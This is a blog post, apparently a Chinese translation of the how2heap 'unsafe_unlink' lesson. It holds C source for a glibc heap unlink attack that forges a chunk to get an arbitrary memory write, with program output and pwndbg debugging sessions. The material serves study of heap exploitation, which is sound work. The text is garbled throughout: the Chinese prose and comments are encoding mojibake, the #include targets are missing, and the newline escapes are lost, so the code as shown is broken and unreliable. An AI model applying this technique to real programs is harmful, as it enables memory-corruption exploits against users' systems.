# how2heapä¹‹unlink
|
##### è¯‘æ–‡å£°æ˜Ž
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŽŸæ–‡ä¸ºå‡†ã€‚
æ¬¢è¿Žå„ä½å–œæ¬¢å®‰å…¨çš„å°ä¼™ä¼´ä»¬åŠ å…¥æ˜Ÿç›Ÿå®‰å…¨ UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
> å‡æœŸåšå†³ä¸å’•å’•å’•!!ç³»åˆ—ä¸€ä¸­æˆ‘è®°å½•äº†first-> fit,fastbin_dup,fastbin_dup_into_stackå’Œfastbin_dup_consolidateå››ä¸ªæ–‡ä»¶çš„ä¸‰ç§æ”»å‡»æ–¹å¼,é‚£ä¹ˆè¿™æ¬¡å°±è®°å½•ä¸€ä¸‹unlinkå­!
PS:ç”±äºŽæœ¬äººæ‰ç–å­¦æµ…,æ–‡ä¸­å¯èƒ½ä¼šæœ‰ä¸€äº›ç†è§£çš„ä¸å¯¹çš„åœ°æ–¹,æ¬¢è¿Žå„ä½æ–§æ­£ ðŸ™‚
## å‚è€ƒç½‘ç«™
    https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/
    https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344nn
    http://blog.leanote.com/post/mut3p1g/how2heap
    https://xz.aliyun.com/t/2582#toc-5
## çŽ¯å¢ƒ
ubuntu16.04,gdb(pwndbg)
## unsafe_unlink
ç¬¬ä¸€ä¸ªå°±æ˜¯ç»å¸¸ä¼šç”¨åˆ°çš„ä¸€ç§æŠ€å·§,unlink,ä¸‹é¢æˆ‘ä»¬å…ˆçœ‹æºä»£ç ,åŒæ ·çš„,æˆ‘åŠ äº†ä¸€å°ç‚¹æ³¨é‡Šå¹¶åˆ äº†å†™ä½œè€…çš„è¯
è¿™é‡Œæˆ‘è§‰å¾—heap
exploitationé‡Œçš„ä¾‹å­æ›´å®¹æ˜“ç†è§£ä¸€ç‚¹23333,è¿™æ˜¯ä¹‹å‰çš„ä¸€ä¸ª[æ€»ç»“](https://nightrainy.github.io/2019/07/19/unlink-study/)
å½“ç„¶,ä¸æƒ³è·³è½¬çš„å°ä¼™ä¼´æˆ‘ä¹Ÿä¼šå¯¹unlinkåšä¸€ä¸‹ç®€å•çš„ä»‹ç»,å…·ä½“çš„ä»‹ç»æˆ‘ä»¬è°ƒè¯•ç€çœ‹:)
**é¦–å…ˆ,ä»€ä¹ˆæ˜¯unlink?**
æ‰€è°“unlinkå°±æ˜¯ä¸ºäº†å–å‡ºåŒå‘é“¾è¡¨ä¸­çš„ä¸€ä¸ªchunk
**é‚£ä¹ˆä»€ä¹ˆæ—¶å€™éœ€è¦å–å‡ºåŒå‘é“¾è¡¨ä¸­çš„chunkå‘¢,ä¹Ÿå°±æ˜¯ä½¿ç”¨unlinkçš„æ—¶æœº?**
  * malloc 
    1. åœ¨æ°å¥½å¤§å°çš„large chunkå¤„å–chunkæ—¶
    2. åœ¨æ¯”è¯·æ±‚å¤§å°å¤§çš„binä¸­å–chunkæ—¶
  * Free 
    1. åŽå‘åˆå¹¶,åˆå¹¶ç‰©ç†ç›¸é‚»ä½Žç‰©ç†åœ°å€ç©ºé—²chunkæ—¶
    2. å‰å‘åˆå¹¶,åˆå¹¶ç‰©ç†ç›¸é‚»é«˜ç‰©ç†åœ°å€ç©ºé—²chunkæ—¶(top chunké™¤å¤–)
  * malloc_consolidate 
    1. åŽå‘åˆå¹¶,åˆå¹¶ç‰©ç†ç›¸é‚»ä½Žåœ°å€ç©ºé—²chunkæ—¶ã€‚
    2. å‰å‘åˆå¹¶ï¼Œåˆå¹¶ç‰©ç†ç›¸é‚»é«˜åœ°å€ç©ºé—² chunkæ—¶ï¼ˆtop chunké™¤å¤–ï¼‰
  * realloc  
å‰å‘æ‰©å±•ï¼Œåˆå¹¶ç‰©ç†ç›¸é‚»é«˜åœ°å€ç©ºé—² chunkï¼ˆé™¤äº†top chunkï¼‰ã€‚
**æ”»å‡»æ•ˆæžœå‘¢?**
æ”»å‡»æ•ˆæžœå°±æ˜¯ på¤„çš„æŒ‡é’ˆä¼šå˜ä¸º p â€“ 0x18;
å¥½å˜žä¸‹é¢æˆ‘ä»¬å›žæ¥,æˆ‘åˆ æŽ‰éƒ¨åˆ†ä½œè€…çš„è¯çš„å¤§æ¦‚æ„æ€:
è¯·åœ¨ubuntu14.04å’Œubuntu16.04ä¸Šæµ‹è¯•,è¿™ä¸ªæŠ€å·§è¿ç”¨åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªå·²çŸ¥åŒºåŸŸçš„æŒ‡é’ˆæ—¶,æˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªæŒ‡é’ˆä¸Šåˆ©ç”¨unlinkè¿™ä¸€æŠ€å·§
æœ€å¸¸è§çš„æƒ…å†µå°±æ˜¯åœ¨ä¸€ä¸ªæœ‰æº¢å‡ºæ¼æ´ž,åˆæœ‰ä¸€ä¸ªå…¨å±€å˜é‡çš„æ—¶å€™
å¥½å˜žæˆ‘ä»¬ç›´æŽ¥çœ‹ä»£ç 
###  æºä»£ç 
    #include 
    #include 
    #include 
    #include 
    uint64_t *chunk0_ptr;
    int main()
    {
            int malloc_size = 0x80; //we want to be big enough not to use fastbins
            int header_size = 2;
            //æœ¬æµ‹è¯•çš„é‡ç‚¹å°±æ˜¯åˆ©ç”¨freeæ¥ç ´åæˆ‘ä»¬çš„å…¨å±€chunk0_pträ»¥å®žçŽ°ä»»æ„åœ°å€å†™
            fprintf(stderr, "The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.nn");
            chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
            uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
            //å…¨å±€æŒ‡é’ˆä¸ºchunk0_ptr,æˆ‘ä»¬å°†è¦æ”»å‡»çš„chunkä¸ºchunk1_ptr
            fprintf(stderr, "The global chunk0_ptr is at %p, pointing to %pn", &chunk0_ptr, chunk0_ptr);
            fprintf(stderr, "The victim chunk we are going to corrupt is at %pnn", chunk1_ptr);
            //æˆ‘ä»¬è¦åœ¨chunk0ä¸­ä¼ªé€ ä¸€ä¸ªchunk
            fprintf(stderr, "We create a fake chunk inside chunk0.n");
            //æˆ‘ä»¬æŠŠæˆ‘ä»¬çš„fake_chunkçš„fdæŒ‡å‘æˆ‘ä»¬çš„chunk0_ptræ¥æ»¡è¶³P->FD->BK=P
            fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.n");
            chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
            //æˆ‘ä»¬æŠŠfake_chunkçš„bkæŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬çš„chunk0_ptræ¥æ»¡è¶³P->BK->FD
            fprintf(stderr, "We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.n");
            //é€šè¿‡è¿™ä¹ˆè®¾ç½®,æˆ‘ä»¬å°±å¯ä»¥æˆåŠŸbypasså †çš„æ£€æµ‹å³(P->FD->BK!=P||P->BK->FD!=P)==FALSE
            fprintf(stderr, "With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == Falsen");
            chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
            fprintf(stderr, "Fake chunk fd: %pn",(void*) chunk0_ptr[2]);
            fprintf(stderr, "Fake chunk bk: %pnn",(void*) chunk0_ptr[3]);
            //æˆ‘ä»¬å‡è®¾æˆ‘ä»¬å¯ä»¥é€šè¿‡æº¢å‡ºchunk0ä½¿å¾—æˆ‘ä»¬å¯ä»¥è‡ªç”±çš„æ›´æ”¹chunk1çš„å†…å®¹
            fprintf(stderr, "We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.n");
            uint64_t *chunk1_hdr = chunk1_ptr - header_size;
            //æˆ‘ä»¬ç”¨chunk1çš„previous_sizeæ¥æ”¶ç¼©chunk0,è®©freeè®¤ä¸ºæˆ‘ä»¬çš„chunk0æ˜¯åœ¨æˆ‘ä»¬çš„ä¼ªé€ çš„chunkçš„åœ°æ–¹å¼€å§‹çš„
            fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.n");
            fprintf(stderr, "It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordinglyn");
            chunk1_hdr[0] = malloc_size;
            //å¦‚æžœæˆ‘ä»¬æ­£å¸¸çš„free chunk0,é‚£ä¹ˆchunk1çš„pre_szieå°†æ˜¯0x90,ç„¶è€ŒçŽ°åœ¨æ˜¯ä¸€ä¸ªæ–°çš„å€¼
            fprintf(stderr, "If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %pn",(void*)chunk1_hdr[0]);
            //æˆ‘ä»¬é€šè¿‡å°†chunk1çš„pre_sizeè®¾ç½®ä¸ºfalse,å°±å¯ä»¥å°†æˆ‘ä»¬æ‰€ä¼ªé€ çš„chunkæ ‡è®°ä¸ºfreeçŠ¶æ€
            fprintf(stderr, "We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.nn");
            chunk1_hdr[1] &= ~1;
            //çŽ°åœ¨æˆ‘ä»¬free chunk1,è¿™æ—¶å‘ç”Ÿå‘åŽåˆå¹¶å°†ä¼šunlinkæˆ‘ä»¬æ‰€ä¼ªé€ çš„chunk,ä»Žè€Œè¦†å†™chunk0_ptr
            fprintf(stderr, "Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.n");
            fprintf(stderr, "You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344nn");
            free(chunk1_ptr);
            //åœ¨è¿™ä¸ªæŒ‡é’ˆä¸Š,æˆ‘ä»¬å¯ä»¥é€šè¿‡chunk0_ptræ¥è¦†å†™å…¶è‡ªèº«ä»¥æŒ‡å‘ä»»æ„å†…å­˜
            fprintf(stderr, "At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.n");
            char victim_string[8];
            strcpy(victim_string,"Hello!~");
            chunk0_ptr[3] = (uint64_t) victim_string;
            //chunk0_ptrå¦‚ä»ŠæŒ‡å‘äº†æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹,æˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥å†™æˆ‘ä»¬çš„å­—ç¬¦ä¸²äº†
            fprintf(stderr, "chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.n");
            fprintf(stderr, "Original value: %sn",victim_string);
            chunk0_ptr[0] = 0x4141414142424242LL;
            fprintf(stderr, "New Value: %sn",victim_string);
    }
###  ç¨‹åºè¿è¡Œç»“æžœ
    The global chunk0_ptr is at 0x602070, pointing to 0x255b010
    The victim chunk we are going to corrupt is at 0x255b0a0
    We create a fake chunk inside chunk0.
    We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
    We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
    With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
    Fake chunk fd: 0x602058
    Fake chunk bk: 0x602060
    We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
    We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
    It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
    If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
    We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.
    Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
    At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
    chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
    Original value: Hello!~
    New Value: BBBBAAAA
###  å…³é”®éƒ¨åˆ†è°ƒè¯•
è‡ªå·±ç¿»è¯‘çš„æ¯›æ¯›èºèºçš„,å¦‚æžœå•çœ‹ä»£ç å’Œç»“æžœä¸ç†è§£çš„è¯ä¸è¦ç€æ€¥,æˆ‘ä»¬æ…¢æ…¢æ¥,æˆ‘ä»¬æ ¹æ®æºç ä¸ŠæŽ¨èçš„ç½‘ç«™å…ˆæŠŠunlinkéƒ¨åˆ†ä»£ç æ‹‰è¿‡æ¥
    1344#define unlink(AV, P, BK, FD) {                                            
    1345     FD = P->fd;                                                               
    1346     BK = P->bk;                                                               
    1347     if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                     
    1348       malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    1349     else {                                                                    
    1350         FD->bk = BK;                                                          
    1351         BK->fd = FD;                                                          
    1352         if (!in_smallbin_range (P->size)                                      
    1353             && __builtin_expect (P->fd_nextsize != NULL, 0)) {                
    1354             if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)        
    1355                 || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    
    1356               malloc_printerr (check_action,                                  
    1357                                "corrupted double-linked list (not small)",    
    1358                                P, AV);                                        
    1359             if (FD->fd_nextsize == NULL) {                                    
    1360                 if (P->fd_nextsize == P)                                      
    1361                   FD->fd_nextsize = FD->bk_nextsize = FD;                     
    1362                 else {                                                        
    1363                     FD->fd_nextsize = P->fd_nextsize;                         
    1364                     FD->bk_nextsize = P->bk_nextsize;                         
    1365                     P->fd_nextsize->bk_nextsize = FD;                         
    1366                     P->bk_nextsize->fd_nextsize = FD;                         
    1367                   }                                                           
    1368               } else {                                                        
    1369                 P->fd_nextsize->bk_nextsize = P->bk_nextsize;                 
    1370                 P->bk_nextsize->fd_nextsize = P->fd_nextsize;                 
    1371               }                                                               
    1372           }                                                                   
    1373       }                                                                       
    1374 }
è¿™é‡Œæˆ‘ä»¬æœ€ä¸»è¦éœ€è¦ç»•è¿‡çš„åœ°æ–¹å°±æ˜¯(FD->bk != P || BK->fd != P)è¿™é‡Œäº†,æˆ‘ä»¬æ ¹æ®å‡½æ•°ä¼ è¿›æ¥çš„ä¸œè¥¿è§£é‡Šä¸€ä¸‹  
FDæ˜¯æˆ‘ä»¬æ‰€ä¼ è¿›æ¥çš„æŒ‡é’ˆPçš„fdæŒ‡é’ˆä¹Ÿå°±æ˜¯FD=P->fd,è€ŒBKå°±æ˜¯P->BK
ä¹Ÿå°±æ˜¯è¯´,æˆ‘ä»¬æ‰€éœ€è¦æ»¡è¶³çš„FD->bk=P,BK->fd=På…¶å®žå°±æ˜¯
  1. P->fd->bk=P,å³ç¨‹åºæ£€æµ‹Pçš„åŽä¸€ä¸ªç©ºé—²æŒ‡é’ˆçš„å‰ä¸€ä¸ªæŒ‡é’ˆä¸ºP
  2. P->bk->fd=P,åŒç†æ£€æµ‹Pçš„å‰ä¸€ä¸ªç©ºé—²æŒ‡é’ˆçš„åŽä¸€ä¸ªæŒ‡é’ˆä¸ºP
å¦‚æžœæˆ‘ä»¬æƒ³åˆ©ç”¨è¯¥æ€Žä¹ˆåšå‘¢?å¸¦ç€ç–‘é—®è®©æˆ‘ä»¬å¼€å§‹è°ƒè¯•ç¨‹åºå§!
å› ä¸ºè¾ƒä¸ºå¤æ‚,è¿™é‡Œæˆ‘ä¸‹äº†8ä¸ªæ–­ç‚¹,åˆ†åˆ«æ˜¯
    â–º 21   chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
      22   uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
    â–º 27   fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.n");
      28   chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
    â–º 31   chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
    â–º 36   uint64_t *chunk1_hdr = chunk1_ptr - header_size;
    â–º 39   chunk1_hdr[0] = malloc_size;
    â–º 42   chunk1_hdr[1] &= ~1;
      50   strcpy(victim_string,"Hello!~");
    â–º 51   chunk0_ptr[3] = (uint64_t) victim_string;
      55   chunk0_ptr[0] = 0x4141414142424242LL;
    â–º 56   fprintf(stderr, "New Value: %sn",victim_string);
é¦–å…ˆæ˜¯ç¬¬ä¸€ä¸ªæ–­ç‚¹çš„åœ°æ–¹,ä¹Ÿå°±æ˜¯malloc chunk0çš„åœ°æ–¹
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 145,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603090 PREV_INUSE {
      prev_size = 0,
      size = 135025,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªå †å—,é‚£ä¹ˆä¸‹é¢æˆ‘ä»¬å•æ­¥èµ°å®Œä¸‹ä¸€ä¸ª,å³æŠŠchunk1ä¹Ÿåˆ†é…äº†,æ­¤æ—¶çš„å †å—
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 0x91,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603090 PREV_INUSE {
      prev_size = 0,
      size = 0x91,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603120 PREV_INUSE {
      prev_size = 0,
      size = 134881,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg>
å¥½å˜ž,æˆ‘ä»¬åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹å¤„,æ²¡é”™,å°±æ˜¯è¿™ä¸ªåœ°æ–¹
    â–º 28   chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
ç¨‹åºçš„æ³¨é‡Šä¸­è¯´æˆ‘ä»¬å°†fake_chunkçš„fdæŒ‡å‘æˆ‘ä»¬çš„chunk0_ptr,æˆ‘ä»¬å…ˆçœ‹çœ‹è¿™ä¸ªæ‰€è°“çš„chunk0_ptr[2]æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿:
    pwndbg> p/x chunk0_ptr
    $3 = 0x603010
    pwndbg> p/x chunk0_ptr[2]
    $4 = 0x602058
    pwndbg> p/x &chunk0_ptr
    $5 = 0x602070
    pwndbg> x/10x 0x602070
    0x602070 :  0x0000000000603010      0x0000000000000000
    0x602080:       0x0000000000000000      0x0000000000000000
    0x602090:       0x0000000000000000      0x0000000000000000
    0x6020a0:       0x0000000000000000      0x0000000000000000